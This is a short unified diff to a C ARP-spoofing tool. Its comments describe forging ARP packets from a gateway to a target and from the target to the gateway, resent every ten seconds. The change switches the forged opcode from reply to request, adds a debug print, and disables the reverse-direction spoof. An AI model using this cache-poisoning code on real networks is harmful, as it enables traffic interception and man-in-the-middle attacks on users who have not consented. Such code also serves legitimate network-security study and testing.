@@ -39,6 +39,7 @@
 
 #define ARPHRD_ETHER    1   
 #define ARPOP_REPLY     2    
+#define ARPOP_REQUEST     1    
 
 #define ARP_CACHE_UPDATE 10
 
@@ -91,7 +92,7 @@ void fill_header (char* dstEth, char *srcip, char *dstip)
 	eth_arp.arp.ar_pro =  htons(ETH_P_IP);
 	eth_arp.arp.ar_hln =  6;
 	eth_arp.arp.ar_pln =  4;
-	eth_arp.arp.ar_op =  htons(ARPOP_REPLY);
+	eth_arp.arp.ar_op =  htons(ARPOP_REQUEST);
 
 	b.s_addr = inet_addr(dstip);
 	a.s_addr = inet_addr(srcip);
@@ -170,7 +171,7 @@ void ascii_to_hwaddr (unsigned char *hwaddr)
 {
 	unsigned char buf[6], t[2];
 	unsigned short a, x, y=0;
-	
+	printf("hwaddr:%s\n",hwaddr);	
 	do {     
 	    t[0] = *hwaddr++;	
 	    t[1] = *hwaddr++;
@@ -207,8 +208,8 @@ main (int argc, char **argv)
 	     fill_header (argv[5],argv[2],argv[4]);   // spoof ARP from gateway to target
 	     send_packet (argv[1]);
 	
-	     fill_header (argv[3], argv[4], argv[2]); // spoof ARP from target to gateway
-	     send_packet (argv[1]);
+	     //fill_header (argv[3], argv[4], argv[2]); // spoof ARP from target to gateway
+	     //send_packet (argv[1]);
 	     sleep (ARP_CACHE_UPDATE);    // send packets every n seconds for ARP cache update
 	     printf ("DONE\n");
 	}
